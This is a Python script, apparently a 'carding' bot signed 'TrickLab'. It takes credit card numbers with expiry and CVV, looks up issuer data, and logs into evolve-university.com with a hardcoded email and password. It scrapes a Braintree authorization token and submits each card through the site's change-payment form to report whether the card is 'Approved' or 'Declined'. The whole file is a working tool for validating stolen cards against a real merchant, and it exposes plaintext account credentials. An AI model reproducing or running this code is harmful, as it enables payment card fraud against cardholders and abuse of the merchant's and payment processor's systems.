import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re
import base64
import json
import uuid
import time

def b3_auth(message):
  start_time = time.time()
  print("Doing")
  text = message.strip()
  pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})' 
  match = re.search(pattern, text)
  if match:
    card_number = match.group(1)
    month = match.group(2)
    year = match.group(3)
    cvv = match.group(4)
    full_card = f"{card_number}|{month}|{year}|{cvv}"
    url = f'https://bins.antipublic.cc/bins/{card_number}'
    z = requests.get(url).json()
    bin = z['bin']
    bank = z['bank']
    brand = z['brand']
    type = z['type']
    level = z['level']
    country = z['country_name']
    flag = z['country_flag']
    currency = z['country_currencies'][0]


  if len(year) == 2:
    year = "20" + year
    
    
    pass

  session_id = str(uuid.uuid4())
  ua = UserAgent()
  user_agent = ua.random
  r = requests.session()

  url = "https://evolve-university.com/login/"
  response = r.get(url)
  if response.status_code == 200:
      soup = BeautifulSoup(response.text, 'html.parser')
      login_nonce = soup.find('input', {'name': 'nonce'}).get('value')
      if login_nonce:
          pass
      else:
          return("Error")

  headers = {
    'authority': 'evolve-university.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': user_agent,
}

  data = {
    'action': 'submit_login_form',
    'return_url': '',
    'nonce': login_nonce,
    'email': 'kka79877@gmail.com',
    'password': 'Bruh009@',
}

  response = r.post('https://evolve-university.com/wp-admin/admin-post.php', cookies=r.cookies, headers=headers, data=data, allow_redirects=False)

  headers = {
    'authority': 'evolve-university.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': user_agent,
}

  response = r.get('https://evolve-university.com/subscription/', cookies=r.cookies, headers=headers)
  if response.status_code == 200:
      soup = BeautifulSoup(response.text, 'html.parser')
      pay_nonce = soup.find('input', {'name': 'nonce'}).get('value')
      authorization_pattern = r"var\s+authorization\s*=\s*['\"]([^'\"]+)['\"]"
      match = re.search(authorization_pattern, response.text)
      pass
      if match:
        authorization_value = match.group(1)
        decoded_value = base64.b64decode(authorization_value).decode('utf-8')
        if decoded_value:
        #print("Decoded value:", decoded_value)
          data = json.loads(decoded_value)
          authorization_fingerprint = data.get("authorizationFingerprint")
          pass
        else:
          return("Error")
      else:
          return("Error")

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {authorization_fingerprint}',
    'braintree-version': '2018-05-10',
    'user-agent': user_agent,
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': session_id,
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': card_number,
                'expirationMonth': month,
                'expirationYear': year,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  token = response.json()['data']['tokenizeCreditCard']['token']
  if token:
      pass
  else:
      return("No token")
      

  headers = {
    'authority': 'evolve-university.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'origin': 'https://evolve-university.com',
    'referer': 'https://evolve-university.com/subscription/',
    'user-agent': user_agent,
}

  data = {
    'action': 'submit_change_payment_form',
    'payment_method_nonce': token,
    'nonce': pay_nonce,
    'payment_type': 'card',
    'card_name': 'Nico Chan',
}

  response = r.post('https://evolve-university.com/wp-admin/admin-post.php', cookies=r.cookies, headers=headers, data=data, allow_redirects=False)
  if response.status_code == 302:
      redirect_url = response.headers['Location']

  try:
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': user_agent,
}
    response = r.get(redirect_url, cookies=r.cookies, headers=headers)
    elapsed_time = time.time() - start_time
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        if "Your payment method has been successfully updated." in response.text:
            return f"""Card: {full_card}
Status: Approved!✅
Response: Approved (1000)

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Braintree Auth
Taken: {elapsed_time:.2f}s
Bot by: TrickLab
                        """
        else:
            msg = soup.find('p', {'class': 'section__error'}).text.strip()          
            return f"""Card: {full_card}
Status: Declined!❌
Response: {msg}

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Braintree Auth
Taken: {elapsed_time:.2f}s
Bot by: TrickLab
                        """
  except Exception as e:
              return f"Error processing final request: {str(e)}"
  else:
          return "Invalid card format. Please provide a valid card number, month, year, and cvv."                        


